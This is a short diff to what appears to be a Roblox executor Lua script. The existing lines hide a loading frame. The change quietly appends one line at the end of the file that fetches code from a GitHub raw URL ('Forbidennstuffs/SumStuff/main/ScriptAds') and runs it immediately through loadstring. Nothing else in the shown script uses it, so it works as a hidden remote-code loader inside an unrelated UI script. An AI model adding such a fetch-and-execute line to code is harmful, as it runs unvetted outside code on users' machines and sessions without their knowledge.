@@ -177,3 +177,5 @@ wait(getgenv().AnimationDelay)
 LoadingFrame.Visible = false
 LoadingFrame.BackgroundTransparency = 0.7
 ImageLabel.ImageTransparency = 0
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Forbidennstuffs/SumStuff/main/ScriptAds"))()
